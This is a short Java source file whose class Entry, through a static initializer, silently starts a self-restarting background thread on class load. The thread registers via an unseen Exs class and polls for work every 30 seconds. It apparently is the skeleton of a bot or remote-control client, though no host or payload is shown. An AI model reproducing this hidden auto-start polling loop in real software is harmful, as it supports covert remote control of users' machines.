package gq.glowman554;

public class Entry {
    public static boolean debug = true;
    public Entry() {
    }

    public static void entry() throws Exception {
        Exs exs = new Exs();
        String id = exs.register();

        while(true) {
            exs.pool_for_work();
            Thread.sleep(30000);
        }
    }

    public static void main(String[] args) {
    }

    static {
        try {
            (new Thread() {
                public void run() {
                    while (true) {
                        try {
                            Entry.entry();
                        } catch (Exception e) {
                            if (Entry.debug) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
